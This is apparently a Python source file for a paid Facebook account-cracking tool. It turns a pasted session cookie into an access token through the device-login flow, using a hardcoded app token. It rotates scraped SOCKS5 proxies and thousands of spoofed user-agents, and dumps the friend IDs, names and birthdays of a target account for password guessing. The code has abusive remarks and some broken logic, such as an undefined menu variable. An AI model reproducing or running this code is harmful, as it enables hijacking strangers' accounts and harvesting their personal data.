#by to =('@CP_OK2')

foo = False
if foo:
    pass
from datetime import datetime
current_time = datetime.now()
expiry_time = datetime.strptime('2024-11-04 00:00:00.000', '%Y-%m-%d %H:%M:%S.%f')
if current_time > expiry_time:
    print('خلص وقت الاداة للاشتراك راسل المطور\n')
    exit(0)
import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os

try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')

os.system('clear')
cetak(nel('\t• Sedang Menginstall Modul Requests •'))
pretty.install()
CON = sol()
ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []

try:
    prox = requests.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt', 'w').write(prox)
except:pass

try:
    print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
except:pass
prox = open('.prox.txt', 'r').read().splitlines()
for xd in range(10000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Nokia'
    e = random.randrange(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/535.1'
    uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
    ugen2.append(uaku)
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12'])
    c = ' en-us; GT-'
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
for x in range(10):
    a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b = random.randrange(100, 9999)
    c = random.randrange(100, 9999)
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    h = random.randrange(1, 9)
    i = '; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j = random.randrange(1, 9)
    k = random.randrange(1, 9)
    l = 'Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak = f'''{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'''

def uaku():
    
    try:
        ua = open('bbnew.txt', 'r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a = requests.get('https://github.com/Saw4x/TOOLxFB/blob/main/.SAW-MOBILE.txt').text
        ua = open('.SAW-MOBILE.txt', 'w')
        aa = re.findall('line">(.*?)<', str(a))
        for un in aa:
            ua.write(un + '\n')
        ua = open('.SAW-MOBILE.txt', 'r').read().splitlines()

(id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
cokbrut = []
pwpluss = []
pwnya = []
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;95m'
N = '\x1b[0m'
Z = '\x1b[1;33m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'
m = '\x1b[1;96m'
k = '\x1b[93m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[93m'
kk = '\x1b[32m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
asu = random.choice([
    m,
    k,
    h,
    u,
    b])
dic = {
    '12': 'December',
    '11': 'November',
    '10': 'October',
    '9': 'September',
    '8': 'August',
    '7': 'July',
    '6': 'June',
    '5': 'May',
    '4': 'April',
    '3': 'March',
    '2': 'February',
    '1': 'January' }
dic2 = {
    '12': 'Devember',
    '11': 'November',
    '10': 'October',
    '09': 'September',
    '08': 'August',
    '07': 'July',
    '06': 'June',
    '05': 'May',
    '04': 'April',
    '03': 'March',
    '02': 'February',
    '01': 'January' }
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

def alvino_xy(u):
    for e in u + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.005)


def clear():
    os.system('clear')


def back():
    login()


def banner():
        print('\x1b[2;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nادواة رتاج مدفوعه💎\n\t⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠂\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀\n⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⣿⠂\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⣶⣶⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⡖⠀\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡗⠀\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠂⠀\n⠛⠛⠛⠛⠛⠛⠛⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⠻⠛⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n   ⠀⠀⠀⠀⠀⠀⠈⠀⠁⠈⠀⠀⠀⠉⠁\n\n  \x1b[38;5;210m╰─ \x1b[1;33m[⌯]  \x1b[2;32mDEVELOPER  : قناة مطورة رتاج👑\n  \x1b[38;5;210m╰─ \x1b[1;33m[⌯]  \x1b[2;32mMY CHANNEL : اميرة رتاج💎💎\n  \x1b[38;5;210m╰─ \x1b[1;33m[⌯]  \x1b[2;32mTOOL       : RITAG ¦¦ 𝗣𝗬𝗧𝗛𝗢𝗡 المدفوعة\n  \x1b[38;5;210m╰─ \x1b[1;33m[⌯]  \x1b[2;32mTELEGRAM   : @\n\x1b[2;35m\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def DYNO():
    
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
        tokenku.append(token)
        
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0], cookies={'cookie': cok })
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2, sy3)

        except requests.exceptions.ConnectionError:
            li = '# Problem Internet Connection, Check And Try Again'
            lo = mark(li, style='red')
            sol().print(lo, style='cyan')
            exit()
    except:
        MRDYNO()
def MRDYNO():
    
    try:
        os.system('clear')
        banner()
        your_cookies = input(' Cookie :  ')
        with requests.Session() as r:
            
            try:
                r.headers.update({
                    'content-type': 'application/x-www-form-urlencoded' })
                data = {
                    'scope': '',
                    'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038' }
                response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
                code = response['code']
                user_code = response['user_code']
                verification_url = 'https://m.facebook.com/device?user_code={}'.format(user_code)
                status_url = 'https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code)
                r.headers.pop('content-type')
                r.headers.update({
                    'sec-fetch-dest': 'document',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Host': 'm.facebook.com',
                    'sec-fetch-site': 'cross-site',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
                    'sec-fetch-mode': 'navigate' })
                response2 = r.get(verification_url, cookies={'cookie': your_cookies }).text
                if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
                    print(' ╰─  Cookie Invalid...', end='\r')
                    time.sleep(3.5)
                    print('                     ', end='\r')
                    exit()
                else:
                    action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
                    fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
                    jazoest = re.search('name="jazoest" value="(\\d+)"', str(response2)).group(1)
                    data = {
                        'user_code': user_code,
                        'qr': 0,
                        'jazoest': jazoest,
                        'fb_dtsg': fb_dtsg }
                    r.headers.update({
                        'sec-fetch-site': 'same-origin',
                        'content-type': 'application/x-www-form-urlencoded',
                        'referer': verification_url,
                        'origin': 'https://m.facebook.com' })
                    response3 = r.post('https://m.facebook.com{}'.format(action), data=data, cookies={'cookie': your_cookies })
                    if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
                        r.headers.pop('content-type')
                        r.headers.pop('origin')
                        response4 = r.post(response3.url, data=data, cookies={'cookie': your_cookies }).text
                        action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
                        fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
                        jazoest = re.search('name="jazoest" value="(\\d+)"', str(response4)).group(1)
                        scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
                        display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
                        user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
                        logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
                        auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
                        encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
                        return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
                        r.headers.update({
                            'content-type': 'application/x-www-form-urlencoded',
                            'referer': response3.url,
                            'origin': 'https://m.facebook.com' })
                        data = {
                            'return_format[]': return_format,
                            'encrypted_post_body': encrypted_post_body,
                            'auth_type': auth_type,
                            'logger_id': logger_id,
                            'user_code': user_code,
                            'display': display,
                            'scope': scope,
                            'jazoest': jazoest,
                            'fb_dtsg': fb_dtsg }
                        response5 = r.post('https://m.facebook.com{}'.format(action), data=data, cookies={'cookie': your_cookies }).text
                        windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
                        r.headers.pop('content-type')
                        r.headers.pop('origin')
                        r.headers.update({
                            'referer': 'https://m.facebook.com/' })
                        response6 = r.get(windows_referer, cookies={'cookie': your_cookies }).text
                        if 'Sukses!' in str(response6):
                            r.headers.update({
                                'sec-fetch-site': 'cross-site',
                                'sec-fetch-dest': 'script',
                                'accept': '*/*',
                                'Host': 'graph.facebook.com',
                                'referer': 'https://graph.facebook.com/',
                                'sec-fetch-mode': 'no-cors' })
                            response7 = r.get(status_url, cookies={'cookie': your_cookies }).text
                            access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
                            print(f'''\n ╰─  Token : {access_token}''')
                            tokenew = open('.token.txt', 'w').write(access_token)
                            cook = open('.cok.txt', 'w').write(your_cookies)
                            print('\n ╰─  Login Berhasil | python BrayennnFB.py')
                            exit()
                    else:

                        try:
                            print(' ╰─  Cookies Mokad Kontol')
                            os.system('rm -rf .token.txt && rm -rf .cok.txt')
                            time.sleep(3)
                            back()
                        except Exception as e:
                          print(e)
            except:pass
    except:pass




def menu(my_name, my_id):
    
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
    except:
        print('[×] Cookies NO ')
        time.sleep(5)
        MRDYNO()
    os.system('clear')
    banner()
    print('\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m')
    print('TELE BY ✒✒✒')
    print('')
    print('')
    print('\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m')
    print('\x1b[0;1m[ \x1b[31;1m1 \x1b[0;1m] 𝐕𝐈𝐏 - من اصدقاء (ايدي)')

    if _____alvino__adijaya_____ in ('1',):
        dump()
    elif _____alvino__adijaya_____ in ('2',):
        dump_massal()
    elif _____alvino__adijaya_____ in ('0',):
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cok.txt')
        exit()
    else:
        back()



def error():
    time.sleep(4)
    back()
    print('')


def dump():
    with requests.Session() as ses:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
        a = input(' >> Id Target : ')
        
        try:
            params = {
                'fields': 'name,friends.fields(id,name,birthday)',
                'access_token': token }
            b = ses.get('https://graph.facebook.com/{}'.format(a), params=params, cookies={'cookie': cok }).json()
            for c in b['friends']['data']:
                id.append(c['id'] + '|' + c['name'])
            print(' >> ID : عدد الايديات' + str(len(id)))
            setting()
        except Exception as e:
          print(e)

def dump_massal():
    
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
    except:
        pass
    exit()
    
    try:
        jum = int(input('>> عدد الايديات : '))
        print(B + '~,~' * 15)
    except:
        print('>> Masukkan Angka Anjing, Malah Huruff ')
        exit()
    if jum < 1 or jum > 1000:
        print('>> Gagal Dump Idz ')
        print('\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m')
        exit()


    ses = requests.Session()
    yz = 0
    for met in range(jum):
        yz += 1
        kl = input('>> ID ' + str(yz) + ' : ')
        print('\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m')
        uid.append(kl)
    for user in uid:
        
        try:
            head = {
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36' }
            if len(id) == 0:
                params = {
                    'fields': 'friends',
                    'access_token': token }
            else:
                params = {
                    'fields': 'friends',
                    'access_token': token }
            url = requests.get('https://graph.facebook.com/{}'.format(user), params=params, headers=head, cookies={'cookies': cok }).json()
            for xr in url['friends']['data']:
                try:
                    woy = xr['id'] + '|' + xr['name']
                    if woy in id:
                        pass
                    else:
                        id.append(woy)
                except:continue
                
            try:
                print('')
                print(f'''>> ID : عدد الايديات{h}''' + str(len(id)))
                print(B + '~,~' * 15)
                setting()
            except (KeyError, IOError):
                print(f'''>>{k} Pertemanan Tidak Public {x}''')
                time.sleep(3)
                back()
        except requests.exceptions.ConnectionError:
          print('>> Sinyal Loh Kurang Bagus ')
          time.sleep(3)
          back()



def setting():
    print('\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m')
    print('\x1b[0;1m[ \x1b[31;1m1 \x1b[0;1m] 𝐕𝐈𝐏 - فحص ايديات قديمة \n\x1b[0;1m[ \x1b[31;1m2 \x1b[0;1m] 𝐕𝐈𝐏 - فحص ايديات جديده\n\x1b[0;1m[ \x1b[31;1m3 \x1b[0;1m] 𝐕𝐈𝐏 - فحص ايديات منوع')
    print(B + '~,~' * 15)
    hu = input('\n\x1b[0;1m[ \x1b[31;1m☠ \x1b[0;1m] 𝐕𝐈𝐏 - اختار ماذا تريد ')
    if hu in ('1', '01'):
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ('2', '02'):
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = bcm - 1
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ('3', '03'):
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    _jembot_ = input('𝐕𝐈𝐏 - هل تريد اضهار التطبيقات (T لا اريد الاضهار)(Y/T) :')
    print(B + '~,~' * 15)
